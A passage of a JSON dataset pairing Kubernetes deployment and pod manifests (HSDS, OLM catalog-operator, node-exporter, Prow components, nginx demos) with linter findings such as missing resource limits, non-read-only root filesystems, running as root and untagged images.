    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: hsds\n  name: hsds\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: hsds\n  template:\n    metadata:\n      labels:\n        app: hsds\n    spec:\n      containers:\n      - name: sn\n        image: hdfgroup/hsds\n        imagePullPolicy: IfNotPresent\n        volumeMounts:\n        - name: accounts\n          mountPath: /config/passwd.txt\n          subPath: passwd.txt\n        - name: config\n          mountPath: /config/config.yml\n          subPath: config.yml\n        - name: override\n          mountPath: /config/override.yml\n          subPath: override.yml\n        ports:\n        - containerPort: 5101\n        env:\n        - name: NODE_TYPE\n          value: sn\n        - name: PASSWORD_FILE\n          value: /config/passwd.txt\n        - name: AZURE_CONNECTION_STRING\n          valueFrom:\n            secretKeyRef:\n              name: azure-conn-str\n              key: az_conn_str\n        - name: AZURE_APP_ID\n          valueFrom:\n            secretKeyRef:\n              name: azure-ad-ids\n              key: az_app_id\n        - name: AZURE_RESOURCE_ID\n          valueFrom:\n            secretKeyRef:\n              name: azure-ad-ids\n              key: az_resource_id\n      - name: dn\n        image: hdfgroup/hsds\n        imagePullPolicy: IfNotPresent\n        volumeMounts:\n        - name: config\n          mountPath: /config/config.yml\n          subPath: config.yml\n        - name: override\n          mountPath: /config/override.yml\n          subPath: override.yml\n        ports:\n        - containerPort: 6101\n        env:\n        - name: NODE_TYPE\n          value: dn\n        - name: AZURE_CONNECTION_STRING\n          valueFrom:\n            secretKeyRef:\n              name: azure-conn-str\n              key: az_conn_str\n      volumes:\n      - name: accounts\n        secret:\n          secretName: user-password\n      - name: config\n        configMap:\n          name: hsds-config\n      - name: override\n        configMap:\n          name: hsds-override\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"dn\" has memory limit 0"
  },
  {
    "id": "01634",
    "manifest_path": "data/manifests/the_stack_sample/sample_0545.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: hsds\n  name: hsds\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: hsds\n  template:\n    metadata:\n      labels:\n        app: hsds\n    spec:\n      containers:\n      - name: sn\n        image: hdfgroup/hsds\n        imagePullPolicy: IfNotPresent\n        volumeMounts:\n        - name: accounts\n          mountPath: /config/passwd.txt\n          subPath: passwd.txt\n        - name: config\n          mountPath: /config/config.yml\n          subPath: config.yml\n        - name: override\n          mountPath: /config/override.yml\n          subPath: override.yml\n        ports:\n        - containerPort: 5101\n        env:\n        - name: NODE_TYPE\n          value: sn\n        - name: PASSWORD_FILE\n          value: /config/passwd.txt\n        - name: AZURE_CONNECTION_STRING\n          valueFrom:\n            secretKeyRef:\n              name: azure-conn-str\n              key: az_conn_str\n        - name: AZURE_APP_ID\n          valueFrom:\n            secretKeyRef:\n              name: azure-ad-ids\n              key: az_app_id\n        - name: AZURE_RESOURCE_ID\n          valueFrom:\n            secretKeyRef:\n              name: azure-ad-ids\n              key: az_resource_id\n      - name: dn\n        image: hdfgroup/hsds\n        imagePullPolicy: IfNotPresent\n        volumeMounts:\n        - name: config\n          mountPath: /config/config.yml\n          subPath: config.yml\n        - name: override\n          mountPath: /config/override.yml\n          subPath: override.yml\n        ports:\n        - containerPort: 6101\n        env:\n        - name: NODE_TYPE\n          value: dn\n        - name: AZURE_CONNECTION_STRING\n          valueFrom:\n            secretKeyRef:\n              name: azure-conn-str\n              key: az_conn_str\n      volumes:\n      - name: accounts\n        secret:\n          secretName: user-password\n      - name: config\n        configMap:\n          name: hsds-config\n      - name: override\n        configMap:\n          name: hsds-override\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"sn\" has memory limit 0"
  },
  {
    "id": "01635",
    "manifest_path": "data/manifests/the_stack_sample/sample_0546.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: catalog-operator\n  namespace: operator-lifecycle-manager\n  labels:\n    app: catalog-operator\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: catalog-operator\n  template:\n    metadata:\n      labels:\n        app: catalog-operator\n    spec:\n      serviceAccountName: olm-operator-serviceaccount\n      containers:\n      - name: catalog-operator\n        command:\n        - /bin/catalog\n        - -namespace\n        - operator-lifecycle-manager\n        - -debug\n        image: quay.io/coreos/catalog@sha256:8fc933e660a5b143bce7a5e4cb1606630fa9497cc252a7e47e0def3c18268f45\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 8080\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8080\n        readinessProbe:\n          httpGet:\n            path: /healthz\n            port: 8080\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"catalog-operator\" does not have a read-only root file system"
  },
  {
    "id": "01636",
    "manifest_path": "data/manifests/the_stack_sample/sample_0546.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: catalog-operator\n  namespace: operator-lifecycle-manager\n  labels:\n    app: catalog-operator\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: catalog-operator\n  template:\n    metadata:\n      labels:\n        app: catalog-operator\n    spec:\n      serviceAccountName: olm-operator-serviceaccount\n      containers:\n      - name: catalog-operator\n        command:\n        - /bin/catalog\n        - -namespace\n        - operator-lifecycle-manager\n        - -debug\n        image: quay.io/coreos/catalog@sha256:8fc933e660a5b143bce7a5e4cb1606630fa9497cc252a7e47e0def3c18268f45\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 8080\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8080\n        readinessProbe:\n          httpGet:\n            path: /healthz\n            port: 8080\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"catalog-operator\" is not set to runAsNonRoot"
  },
  {
    "id": "01637",
    "manifest_path": "data/manifests/the_stack_sample/sample_0546.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: catalog-operator\n  namespace: operator-lifecycle-manager\n  labels:\n    app: catalog-operator\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: catalog-operator\n  template:\n    metadata:\n      labels:\n        app: catalog-operator\n    spec:\n      serviceAccountName: olm-operator-serviceaccount\n      containers:\n      - name: catalog-operator\n        command:\n        - /bin/catalog\n        - -namespace\n        - operator-lifecycle-manager\n        - -debug\n        image: quay.io/coreos/catalog@sha256:8fc933e660a5b143bce7a5e4cb1606630fa9497cc252a7e47e0def3c18268f45\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 8080\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8080\n        readinessProbe:\n          httpGet:\n            path: /healthz\n            port: 8080\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"catalog-operator\" has cpu request 0"
  },
  {
    "id": "01638",
    "manifest_path": "data/manifests/the_stack_sample/sample_0546.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: catalog-operator\n  namespace: operator-lifecycle-manager\n  labels:\n    app: catalog-operator\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: catalog-operator\n  template:\n    metadata:\n      labels:\n        app: catalog-operator\n    spec:\n      serviceAccountName: olm-operator-serviceaccount\n      containers:\n      - name: catalog-operator\n        command:\n        - /bin/catalog\n        - -namespace\n        - operator-lifecycle-manager\n        - -debug\n        image: quay.io/coreos/catalog@sha256:8fc933e660a5b143bce7a5e4cb1606630fa9497cc252a7e47e0def3c18268f45\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 8080\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8080\n        readinessProbe:\n          httpGet:\n            path: /healthz\n            port: 8080\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"catalog-operator\" has memory limit 0"
  },
  {
    "id": "01639",
    "manifest_path": "data/manifests/the_stack_sample/sample_0550.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: node-exporter\n  labels:\n    app: node-exporter\nspec:\n  selector:\n    matchLabels:\n      app: node-exporter\n  template:\n    metadata:\n      labels:\n        app: node-exporter\n    spec:\n      containers:\n      - name: node-exporter\n        image: quay.io/prometheus/node-exporter:v1.0.1\n        args:\n        - --web.listen-address=127.0.0.1:9100\n        - --path.procfs=/host/proc\n        - --path.sysfs=/host/sys\n        - --path.rootfs=/host/root\n        - --no-collector.wifi\n        - --no-collector.hwmon\n        volumeMounts:\n        - mountPath: /host/proc\n          mountPropagation: HostToContainer\n          name: proc\n          readOnly: true\n        - mountPath: /host/sys\n          mountPropagation: HostToContainer\n          name: sys\n          readOnly: true\n        - mountPath: /host/root\n          mountPropagation: HostToContainer\n          name: root\n          readOnly: true\n      volumes:\n      - name: proc\n        hostPath:\n          path: /proc\n      - name: sys\n        hostPath:\n          path: /sys\n      - name: root\n        hostPath:\n          path: /\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"node-exporter\" does not have a read-only root file system"
  },
  {
    "id": "01640",
    "manifest_path": "data/manifests/the_stack_sample/sample_0550.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: node-exporter\n  labels:\n    app: node-exporter\nspec:\n  selector:\n    matchLabels:\n      app: node-exporter\n  template:\n    metadata:\n      labels:\n        app: node-exporter\n    spec:\n      containers:\n      - name: node-exporter\n        image: quay.io/prometheus/node-exporter:v1.0.1\n        args:\n        - --web.listen-address=127.0.0.1:9100\n        - --path.procfs=/host/proc\n        - --path.sysfs=/host/sys\n        - --path.rootfs=/host/root\n        - --no-collector.wifi\n        - --no-collector.hwmon\n        volumeMounts:\n        - mountPath: /host/proc\n          mountPropagation: HostToContainer\n          name: proc\n          readOnly: true\n        - mountPath: /host/sys\n          mountPropagation: HostToContainer\n          name: sys\n          readOnly: true\n        - mountPath: /host/root\n          mountPropagation: HostToContainer\n          name: root\n          readOnly: true\n      volumes:\n      - name: proc\n        hostPath:\n          path: /proc\n      - name: sys\n        hostPath:\n          path: /sys\n      - name: root\n        hostPath:\n          path: /\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"node-exporter\" is not set to runAsNonRoot"
  },
  {
    "id": "01641",
    "manifest_path": "data/manifests/the_stack_sample/sample_0550.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: node-exporter\n  labels:\n    app: node-exporter\nspec:\n  selector:\n    matchLabels:\n      app: node-exporter\n  template:\n    metadata:\n      labels:\n        app: node-exporter\n    spec:\n      containers:\n      - name: node-exporter\n        image: quay.io/prometheus/node-exporter:v1.0.1\n        args:\n        - --web.listen-address=127.0.0.1:9100\n        - --path.procfs=/host/proc\n        - --path.sysfs=/host/sys\n        - --path.rootfs=/host/root\n        - --no-collector.wifi\n        - --no-collector.hwmon\n        volumeMounts:\n        - mountPath: /host/proc\n          mountPropagation: HostToContainer\n          name: proc\n          readOnly: true\n        - mountPath: /host/sys\n          mountPropagation: HostToContainer\n          name: sys\n          readOnly: true\n        - mountPath: /host/root\n          mountPropagation: HostToContainer\n          name: root\n          readOnly: true\n      volumes:\n      - name: proc\n        hostPath:\n          path: /proc\n      - name: sys\n        hostPath:\n          path: /sys\n      - name: root\n        hostPath:\n          path: /\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"node-exporter\" has cpu request 0"
  },
  {
    "id": "01642",
    "manifest_path": "data/manifests/the_stack_sample/sample_0550.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: node-exporter\n  labels:\n    app: node-exporter\nspec:\n  selector:\n    matchLabels:\n      app: node-exporter\n  template:\n    metadata:\n      labels:\n        app: node-exporter\n    spec:\n      containers:\n      - name: node-exporter\n        image: quay.io/prometheus/node-exporter:v1.0.1\n        args:\n        - --web.listen-address=127.0.0.1:9100\n        - --path.procfs=/host/proc\n        - --path.sysfs=/host/sys\n        - --path.rootfs=/host/root\n        - --no-collector.wifi\n        - --no-collector.hwmon\n        volumeMounts:\n        - mountPath: /host/proc\n          mountPropagation: HostToContainer\n          name: proc\n          readOnly: true\n        - mountPath: /host/sys\n          mountPropagation: HostToContainer\n          name: sys\n          readOnly: true\n        - mountPath: /host/root\n          mountPropagation: HostToContainer\n          name: root\n          readOnly: true\n      volumes:\n      - name: proc\n        hostPath:\n          path: /proc\n      - name: sys\n        hostPath:\n          path: /sys\n      - name: root\n        hostPath:\n          path: /\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"node-exporter\" has memory limit 0"
  },
  {
    "id": "01643",
    "manifest_path": "data/manifests/the_stack_sample/sample_0551.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: prow\n  name: sinker\n  labels:\n    app: sinker\nspec:\n  selector:\n    matchLabels:\n      app: sinker\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: sinker\n    spec:\n      serviceAccountName: sinker\n      containers:\n      - name: sinker\n        image: gcr.io/k8s-prow/sinker:v20211206-64485af39f\n        args:\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        - --dry-run=false\n        volumeMounts:\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n      volumes:\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"sinker\" does not have a read-only root file system"
  },
  {
    "id": "01644",
    "manifest_path": "data/manifests/the_stack_sample/sample_0551.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: prow\n  name: sinker\n  labels:\n    app: sinker\nspec:\n  selector:\n    matchLabels:\n      app: sinker\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: sinker\n    spec:\n      serviceAccountName: sinker\n      containers:\n      - name: sinker\n        image: gcr.io/k8s-prow/sinker:v20211206-64485af39f\n        args:\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        - --dry-run=false\n        volumeMounts:\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n      volumes:\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"sinker\" is not set to runAsNonRoot"
  },
  {
    "id": "01645",
    "manifest_path": "data/manifests/the_stack_sample/sample_0551.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: prow\n  name: sinker\n  labels:\n    app: sinker\nspec:\n  selector:\n    matchLabels:\n      app: sinker\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: sinker\n    spec:\n      serviceAccountName: sinker\n      containers:\n      - name: sinker\n        image: gcr.io/k8s-prow/sinker:v20211206-64485af39f\n        args:\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        - --dry-run=false\n        volumeMounts:\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n      volumes:\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"sinker\" has cpu request 0"
  },
  {
    "id": "01646",
    "manifest_path": "data/manifests/the_stack_sample/sample_0551.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: prow\n  name: sinker\n  labels:\n    app: sinker\nspec:\n  selector:\n    matchLabels:\n      app: sinker\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: sinker\n    spec:\n      serviceAccountName: sinker\n      containers:\n      - name: sinker\n        image: gcr.io/k8s-prow/sinker:v20211206-64485af39f\n        args:\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        - --dry-run=false\n        volumeMounts:\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n      volumes:\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"sinker\" has memory limit 0"
  },
  {
    "id": "01647",
    "manifest_path": "data/manifests/the_stack_sample/sample_0553.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-499\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"nginx\" is using an invalid container image, \"nginx\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "01648",
    "manifest_path": "data/manifests/the_stack_sample/sample_0553.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-499\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx\" does not have a read-only root file system"
  },
  {
    "id": "01649",
    "manifest_path": "data/manifests/the_stack_sample/sample_0553.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-499\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx\" is not set to runAsNonRoot"
  },
  {
    "id": "01650",
    "manifest_path": "data/manifests/the_stack_sample/sample_0553.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-499\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx\" has cpu request 0"
  },
  {
    "id": "01651",
    "manifest_path": "data/manifests/the_stack_sample/sample_0553.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-499\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx\" has memory limit 0"
  },
  {
    "id": "01652",
    "manifest_path": "data/manifests/the_stack_sample/sample_0558.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: csi-scale-staticdemo-pod\n  labels:\n    app: nginx\nspec:\n  containers:\n  - name: web-server\n    image: nginx\n    volumeMounts:\n    - name: mypvc\n      mountPath: /usr/share/nginx/html/scale\n    ports:\n    - containerPort: 80\n  volumes:\n  - name: mypvc\n    persistentVolumeClaim:\n      claimName: scale-static-pvc\n      readOnly: false\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"web-server\" is using an invalid container image, \"nginx\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "01653",
    "manifest_path": "data/manifests/the_stack_sample/sample_0558.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: csi-scale-staticdemo-pod\n  labels:\n    app: nginx\nspec:\n  containers:\n  - name: web-server\n    image: nginx\n    volumeMounts:\n    - name: mypvc\n      mountPath: /usr/share/nginx/html/scale\n    ports:\n    - containerPort: 80\n  volumes:\n  - name: mypvc\n    persistentVolumeClaim:\n      claimName: scale-static-pvc\n      readOnly: false\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"web-server\" does not have a read-only root file system"
  },
  {
    "id": "01654",
    "manifest_path": "data/manifests/the_stack_sample/sample_0558.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: csi-scale-staticdemo-pod\n  labels:\n    app: nginx\nspec:\n  containers:\n  - name: web-server\n    image: nginx\n    volumeMounts:\n    - name: mypvc\n      mountPath: /usr/share/nginx/html/scale\n    ports:\n    - containerPort: 80\n  volumes:\n  - name: mypvc\n    persistentVolumeClaim:\n      claimName: scale-static-pvc\n      readOnly: false\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"web-server\" is not set to runAsNonRoot"
  },
  {
    "id": "01655",
    "manifest_path": "data/manifests/the_stack_sample/sample_0558.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: csi-scale-staticdemo-pod\n  labels:\n    app: nginx\nspec:\n  containers:\n  - name: web-server\n    image: nginx\n    volumeMounts:\n    - name: mypvc\n      mountPath: /usr/share/nginx/html/scale\n    ports:\n    - containerPort: 80\n  volumes:\n  - name: mypvc\n    persistentVolumeClaim:\n      claimName: scale-static-pvc\n      readOnly: false\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"web-server\" has cpu request 0"
  },
  {
    "id": "01656",
    "manifest_path": "data/manifests/the_stack_sample/sample_0558.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: csi-scale-staticdemo-pod\n  labels:\n    app: nginx\nspec:\n  containers:\n  - name: web-server\n    image: nginx\n    volumeMounts:\n    - name: mypvc\n      mountPath: /usr/share/nginx/html/scale\n    ports:\n    - containerPort: 80\n  volumes:\n  - name: mypvc\n    persistentVolumeClaim:\n      claimName: scale-static-pvc\n      readOnly: false\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"web-server\" has memory limit 0"
  },
  {
    "id": "01657",
    "manifest_path": "data/manifests/the_stack_sample/sample_0560.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: crier\n  labels:\n    app: crier\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: crier\n  template:\n    metadata:\n      labels:\n        app: crier\n    spec:\n      serviceAccountName: crier\n      containers:\n      - name: crier\n        image: gcr.io/k8s-prow/crier:v20201001-0240871903\n        args:\n        - --blob-storage-workers=1\n        - --config-path=/etc/config/config.yaml\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/oauth\n        - --github-workers=5\n        - --job-config-path=/etc/job-config\n        - --kubeconfig=/etc/kubeconfig/config\n        - --kubernetes-blob-storage-workers=1\n        - --slack-token-file=/etc/slack/token\n        - --slack-workers=1\n        volumeMounts:\n        - mountPath: /etc/kubeconfig\n          name: kubeconfig\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: slack\n          mountPath: /etc/slack\n          readOnly: true\n      volumes:\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: slack\n        secret:\n          secretName: slack-token\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"crier\" does not have a read-only root file system"
  },
  {
    "id": "01658",
    "manifest_path": "data/manifests/the_stack_sample/sample_0560.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: crier\n  labels:\n    app: crier\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: crier\n  template:\n    metadata:\n      labels:\n        app: crier\n    spec:\n      serviceAccountName: crier\n      containers:\n      - name: crier\n        image: gcr.io/k8s-prow/crier:v20201001-0240871903\n        args:\n        - --blob-storage-workers=1\n        - --config-path=/etc/config/config.yaml\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/oauth\n        - --github-workers=5\n        - --job-config-path=/etc/job-config\n        - --kubeconfig=/etc/kubeconfig/config\n        - --kubernetes-blob-storage-workers=1\n        - --slack-token-file=/etc/slack/token\n        - --slack-workers=1\n        volumeMounts:\n        - mountPath: /etc/kubeconfig\n          name: kubeconfig\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: slack\n          mountPath: /etc/slack\n          readOnly: true\n      volumes:\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: slack\n        secret:\n          secretName: slack-token\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"crier\" is not set to runAsNonRoot"
  },
  {
    "id": "01659",
    "manifest_path": "data/manifests/the_stack_sample/sample_0560.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: crier\n  labels:\n    app: crier\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: crier\n  template:\n    metadata:\n      labels:\n        app: crier\n    spec:\n      serviceAccountName: crier\n      containers:\n      - name: crier\n        image: gcr.io/k8s-prow/crier:v20201001-0240871903\n        args:\n        - --blob-storage-workers=1\n        - --config-path=/etc/config/config.yaml\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/oauth\n        - --github-workers=5\n        - --job-config-path=/etc/job-config\n        - --kubeconfig=/etc/kubeconfig/config\n        - --kubernetes-blob-storage-workers=1\n        - --slack-token-file=/etc/slack/token\n        - --slack-workers=1\n        volumeMounts:\n        - mountPath: /etc/kubeconfig\n          name: kubeconfig\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: slack\n          mountPath: /etc/slack\n          readOnly: true\n      volumes:\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: slack\n        secret:\n          secretName: slack-token\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"crier\" has cpu request 0"
  },
  {
    "id": "01660",
    "manifest_path": "data/manifests/the_stack_sample/sample_0560.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: crier\n  labels:\n    app: crier\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: crier\n  template:\n    metadata:\n      labels:\n        app: crier\n    spec:\n      serviceAccountName: crier\n      containers:\n      - name: crier\n        image: gcr.io/k8s-prow/crier:v20201001-0240871903\n        args:\n        - --blob-storage-workers=1\n        - --config-path=/etc/config/config.yaml\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/oauth\n        - --github-workers=5\n        - --job-config-path=/etc/job-config\n        - --kubeconfig=/etc/kubeconfig/config\n        - --kubernetes-blob-storage-workers=1\n        - --slack-token-file=/etc/slack/token\n        - --slack-workers=1\n        volumeMounts:\n        - mountPath: /etc/kubeconfig\n          name: kubeconfig\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: slack\n          mountPath: /etc/slack\n          readOnly: true\n      volumes:\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: slack\n        secret:\n          secretName: slack-token\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"crier\" has memory limit 0"
  },
  {
    "id": "01661",
    "manifest_path": "data/manifests/the_stack_sample/sample_0562.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-716\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"nginx\" is using an invalid container image, \"nginx\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "01662",
    "manifest_path": "data/manifests/the_stack_sample/sample_0562.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-716\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx\" does not have a read-only root file system"
  },
  {
    "id": "01663",
    "manifest_path": "data/manifests/the_stack_sample/sample_0562.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-716\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx\" is not set to runAsNonRoot"
  },
  {
    "id": "01664",
    "manifest_path": "data/manifests/the_stack_sample/sample_0562.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-716\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx\" has cpu request 0"
  },
  {
    "id": "01665",
    "manifest_path": "data/manifests/the_stack_sample/sample_0562.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-716\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx\" has memory limit 0"
  },
  {
    "id": "01666",
    "manifest_path": "data/manifests/the_stack_sample/sample_0563.yaml",
